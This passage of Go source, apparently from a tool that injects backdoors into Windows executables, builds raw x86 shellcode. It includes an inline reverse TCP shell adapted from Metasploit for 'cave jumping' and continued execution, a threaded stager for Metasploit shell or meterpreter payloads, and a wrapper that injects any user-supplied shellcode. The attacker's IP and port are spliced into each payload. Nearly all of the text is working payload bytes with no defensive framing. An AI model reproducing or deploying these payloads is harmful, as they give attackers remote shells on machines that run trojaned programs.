	if ps, err := api.PackUint32(uint32(len(shellcode2))); err == nil {
		shellcode1 += ps
	} else {
		return nil, err
	}
	return []byte(win32_stackpreserve + shellcode1 + shellcode2), nil
}

func reverse_tcp_shell_inline_win_intel_32(params api.Parameters) ([]byte, error) {
	port := params.Port
	//entry := params.Entry
	ip := params.IP
	/*
	   Modified metasploit windows/shell_reverse_tcp shellcode
	   to enable continued execution and cave jumping.
	*/

	shellcode1 := "\xfc\xe8"
	shellcode1 += "\x89\x00\x00\x00"
	shellcode1 += "\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30" +
		"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff" +
		"\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2" +
		"\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85" +
		"\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3" +
		"\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d" +
		"\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58" +
		"\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b" +
		"\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff" +
		"\xe0\x58\x5f\x5a\x8b\x12\xeb\x86"

	shellcode2 := "\x5d\x68\x33\x32\x00\x00\x68" +
		"\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8\x90\x01" +
		"\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00\xff\xd5\x50\x50" +
		"\x50\x50\x40\x50\x40\x50\x68\xea\x0f\xdf\xe0\xff\xd5\x89\xc7" +
		"\x68"

	shellcode2 += api.PackIP(ip) // IP
	shellcode2 += ("\x68\x02\x00")
	if ps, err := api.PackPort(port); err == nil { // PORT
		shellcode2 += ps
	} else {
		return nil, err
	}
	shellcode2 += "\x89\xe6\x6a\x10\x56" +
		"\x57\x68\x99\xa5\x74\x61\xff\xd5\x68\x63\x6d\x64\x00\x89\xe3" +
		"\x57\x57\x57\x31\xf6\x6a\x12\x59\x56\xe2\xfd\x66\xc7\x44\x24" +
		"\x3c\x01\x01\x8d\x44\x24\x10\xc6\x00\x44\x54\x50\x56\x56\x56" +
		"\x46\x56\x4e\x56\x56\x53\x56\x68\x79\xcc\x3f\x86\xff\xd5\x89" +
		//The NOP in the line below allows for continued execution.
		"\xe0\x4e\x90\x46\xff\x30\x68\x08\x87\x1d\x60\xff\xd5\xbb\xf0" +
		"\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80" +
		"\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53" +
		"\x81\xc4\xfc\x01\x00\x00"

	return []byte(win32_stackpreserve + shellcode1 + shellcode2 + win32_stackrestore), nil
}

func reverse_tcp_stager_threaded_win_intel_32(params api.Parameters) ([]byte, error) {
	port := params.Port
	//entry := params.Entry
	ip := params.IP

	/*
	   Reverse tcp stager. Can be used with windows/shell/reverse_tcp or
	   windows/meterpreter/reverse_tcp payloads from metasploit.
	*/

	shellcode2 := "\xE8\xB7\xFF\xFF\xFF"
	//Can inject any shellcode below.
	//ADD STUB HERE
	shellcode2 += strings.Repeat("\x41", 58)

	shellcode2 += "\xFC\xE8\x89\x00\x00\x00\x60\x89\xE5\x31\xD2\x64\x8B\x52\x30\x8B\x52" +
		"\x0C\x8B\x52\x14\x8B\x72\x28\x0F\xB7\x4A\x26\x31\xFF\x31\xC0\xAC" +
		"\x3C\x61\x7C\x02\x2C\x20\xC1\xCF\x0D\x01\xC7\xE2\xF0\x52\x57\x8B" +
		"\x52\x10\x8B\x42\x3C\x01\xD0\x8B\x40\x78\x85\xC0\x74\x4A\x01\xD0" +
		"\x50\x8B\x48\x18\x8B\x58\x20\x01\xD3\xE3\x3C\x49\x8B\x34\x8B\x01" +
		"\xD6\x31\xFF\x31\xC0\xAC\xC1\xCF\x0D\x01\xC7\x38\xE0\x75\xF4\x03" +
		"\x7D\xF8\x3B\x7D\x24\x75\xE2\x58\x8B\x58\x24\x01\xD3\x66\x8B\x0C" +
		"\x4B\x8B\x58\x1C\x01\xD3\x8B\x04\x8B\x01\xD0\x89\x44\x24\x24\x5B" +
		"\x5B\x61\x59\x5A\x51\xFF\xE0\x58\x5F\x5A\x8B\x12\xEB\x86\x5D\x68" +
		"\x33\x32\x00\x00\x68\x77\x73\x32\x5F\x54\x68\x4C\x77\x26\x07\xFF" +
		"\xD5\xB8\x90\x01\x00\x00\x29\xC4\x54\x50\x68\x29\x80\x6B\x00\xFF" +
		"\xD5\x50\x50\x50\x50\x40\x50\x40\x50\x68\xEA\x0F\xDF\xE0\xFF\xD5" +
		"\x97\x6A\x05\x68"

	shellcode2 += api.PackIP(ip) // IP
	shellcode2 += ("\x68\x02\x00")
	if ps, err := api.PackPort(port); err == nil { // PORT
		shellcode2 += ps
	} else {
		return nil, err
	}
	shellcode2 += "\x89\xE6\x6A" +
		"\x10\x56\x57\x68\x99\xA5\x74\x61\xFF\xD5\x85\xC0\x74\x0C\xFF\x4E" +
		"\x08\x75\xEC\x68\xF0\xB5\xA2\x56\xFF\xD5\x6A\x00\x6A\x04\x56\x57" +
		"\x68\x02\xD9\xC8\x5F\xFF\xD5\x8B\x36\x6A\x40\x68\x00\x10\x00\x00" +
		"\x56\x6A\x00\x68\x58\xA4\x53\xE5\xFF\xD5\x93\x53\x6A\x00\x56\x53" +
		"\x57\x68\x02\xD9\xC8\x5F\xFF\xD5\x01\xC3\x29\xC6\x85\xF6\x75\xEC\xC3"

	//shellcode1 is the thread
	shellcode1 := "\xFC\x90\xE8\xC1\x00\x00\x00\x60\x89\xE5\x31\xD2\x90\x64\x8B" +
		"\x52\x30\x8B\x52\x0C\x8B\x52\x14\xEB\x02" +
		"\x41\x10\x8B\x72\x28\x0F\xB7\x4A\x26\x31\xFF\x31\xC0\xAC\x3C\x61" +
		"\x7C\x02\x2C\x20\xC1\xCF\x0D\x01\xC7\x49\x75\xEF\x52\x90\x57\x8B" +
		"\x52\x10\x90\x8B\x42\x3C\x01\xD0\x90\x8B\x40\x78\xEB\x07\xEA\x48" +
		"\x42\x04\x85\x7C\x3A\x85\xC0\x0F\x84\x68\x00\x00\x00\x90\x01\xD0" +
		"\x50\x90\x8B\x48\x18\x8B\x58\x20\x01\xD3\xE3\x58\x49\x8B\x34\x8B" +
		"\x01\xD6\x31\xFF\x90\x31\xC0\xEB\x04\xFF\x69\xD5\x38\xAC\xC1\xCF" +
		"\x0D\x01\xC7\x38\xE0\xEB\x05\x7F\x1B\xD2\xEB\xCA\x75\xE6\x03\x7D" +
		"\xF8\x3B\x7D\x24\x75\xD4\x58\x90\x8B\x58\x24\x01\xD3\x90\x66\x8B" +
		"\x0C\x4B\x8B\x58\x1C\x01\xD3\x90\xEB\x04\xCD\x97\xF1\xB1\x8B\x04" +
		"\x8B\x01\xD0\x90\x89\x44\x24\x24\x5B\x5B\x61\x90\x59\x5A\x51\xEB" +
		"\x01\x0F\xFF\xE0\x58\x90\x5F\x5A\x8B\x12\xE9\x53\xFF\xFF\xFF\x90" +
		"\x5D\x90" +
		"\xBE"

	if ps, err := api.PackUint32(uint32(len(shellcode2) - 5)); err == nil { // \x22\x01\x00\x00"  // <---Size of shellcode2 in hex
		shellcode1 += ps
	} else {
		return nil, err
	}
	shellcode1 += "\x90\x6A\x40\x90\x68\x00\x10\x00\x00" +
		"\x56\x90\x6A\x00\x68\x58\xA4\x53\xE5\xFF\xD5\x89\xC3\x89\xC7\x90" +
		"\x89\xF1"

	shellcode1 += "\xeb\x44" // <--length of shellcode below
	shellcode1 += "\x90\x5e"
	shellcode1 += "\x90\x90\x90" +
		"\xF2\xA4" +
		"\xE8\x20\x00\x00" +
		"\x00\xBB\xE0\x1D\x2A\x0A\x90\x68\xA6\x95\xBD\x9D\xFF\xD5\x3C\x06" +
		"\x7C\x0A\x80\xFB\xE0\x75\x05\xBB\x47\x13\x72\x6F\x6A\x00\x53\xFF" +
		"\xD5\x31\xC0\x50\x50\x50\x53\x50\x50\x68\x38\x68\x0D\x16\xFF\xD5" +
		"\x58\x58\x90\x61"

	shellcode1 += "\xe9"
	if ps, err := api.PackUint32(uint32(len(shellcode2))); err == nil {
		shellcode1 += ps
	} else {
		return nil, err
	}
	return []byte(win32_stackpreserve + shellcode1 + shellcode2), nil
}

func user_shellcode_threaded_win_intel_32(params api.Parameters) ([]byte, error) {
	//entry := params.Entry

	/*
	   This module allows for the user to provide a win32 raw/binary
	   shellcode.  For use with the -U flag.  Make sure to use a process safe exit function.
	*/
	shellcode2 := "\xE8\xB7\xFF\xFF\xFF"

	//Can inject any shellcode below.
	shellcode2 += strings.Repeat("\x41", 58)

	shellcode2 += string(params.ShellCode)

	shellcode1 := "\xFC\x90\xE8\xC1\x00\x00\x00\x60\x89\xE5\x31\xD2\x90\x64\x8B" +
		"\x52\x30\x8B\x52\x0C\x8B\x52\x14\xEB\x02" +
		"\x41\x10\x8B\x72\x28\x0F\xB7\x4A\x26\x31\xFF\x31\xC0\xAC\x3C\x61" +
		"\x7C\x02\x2C\x20\xC1\xCF\x0D\x01\xC7\x49\x75\xEF\x52\x90\x57\x8B" +
		"\x52\x10\x90\x8B\x42\x3C\x01\xD0\x90\x8B\x40\x78\xEB\x07\xEA\x48" +
		"\x42\x04\x85\x7C\x3A\x85\xC0\x0F\x84\x68\x00\x00\x00\x90\x01\xD0" +
		"\x50\x90\x8B\x48\x18\x8B\x58\x20\x01\xD3\xE3\x58\x49\x8B\x34\x8B" +
		"\x01\xD6\x31\xFF\x90\x31\xC0\xEB\x04\xFF\x69\xD5\x38\xAC\xC1\xCF" +
		"\x0D\x01\xC7\x38\xE0\xEB\x05\x7F\x1B\xD2\xEB\xCA\x75\xE6\x03\x7D" +
		"\xF8\x3B\x7D\x24\x75\xD4\x58\x90\x8B\x58\x24\x01\xD3\x90\x66\x8B" +
		"\x0C\x4B\x8B\x58\x1C\x01\xD3\x90\xEB\x04\xCD\x97\xF1\xB1\x8B\x04" +
		"\x8B\x01\xD0\x90\x89\x44\x24\x24\x5B\x5B\x61\x90\x59\x5A\x51\xEB" +
		"\x01\x0F\xFF\xE0\x58\x90\x5F\x5A\x8B\x12\xE9\x53\xFF\xFF\xFF\x90" +
		"\x5D\x90" +
		"\xBE"
	if ps, err := api.PackUint32(uint32(len(shellcode2) - 5)); err == nil {
		shellcode1 += ps
	} else {
		return nil, err
	}
	shellcode1 += "\x90\x6A\x40\x90\x68\x00\x10\x00\x00" +
		"\x56\x90\x6A\x00\x68\x58\xA4\x53\xE5\xFF\xD5\x89\xC3\x89\xC7\x90" +
		"\x89\xF1"

	shellcode1 += "\xeb\x44" // <--length of shellcode below
	shellcode1 += "\x90\x5e"
	shellcode1 += "\x90\x90\x90" +
		"\xF2\xA4" +
		"\xE8\x20\x00\x00" +
		"\x00\xBB\xE0\x1D\x2A\x0A\x90\x68\xA6\x95\xBD\x9D\xFF\xD5\x3C\x06" +
		"\x7C\x0A\x80\xFB\xE0\x75\x05\xBB\x47\x13\x72\x6F\x6A\x00\x53\xFF" +
		"\xD5\x31\xC0\x50\x50\x50\x53\x50\x50\x68\x38\x68\x0D\x16\xFF\xD5" +
		"\x58\x58\x90\x61"

	//    shellcode1 += "\xEB\x06\x01\x00\x00"
	//This needs to be in the above statement
	shellcode1 += "\xe9"
	if ps, err := api.PackUint32(uint32(len(shellcode2))); err == nil {
		shellcode1 += ps
	} else {
		return nil, err
	}

	return []byte(win32_stackpreserve + shellcode1 + shellcode2), nil
}
